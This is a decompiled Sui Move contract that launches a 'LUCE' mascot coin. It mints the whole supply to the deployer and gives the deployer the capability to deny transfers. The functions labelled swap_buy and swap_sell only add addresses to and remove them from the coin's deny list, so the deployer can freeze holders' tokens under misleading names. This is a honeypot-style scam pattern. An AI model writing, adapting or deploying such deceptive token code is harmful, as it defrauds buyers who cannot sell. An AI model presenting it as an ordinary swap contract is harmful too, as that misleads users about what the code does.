module 0xe16e7931d8fd454e1a5e26c377a35b1c8c1bab6b1ba16114eab04d4e1bc26fd1::luce {
    struct LUCE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: LUCE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<LUCE>(arg0, 9, b"LUCE", b"Official Mascot of the Holy Year", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmfVR3qRiUJVe6vydvfEjfMj5o1CJ8cbisp8gC2yonzNst"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<LUCE>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<LUCE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<LUCE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<LUCE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LUCE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<LUCE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<LUCE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<LUCE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

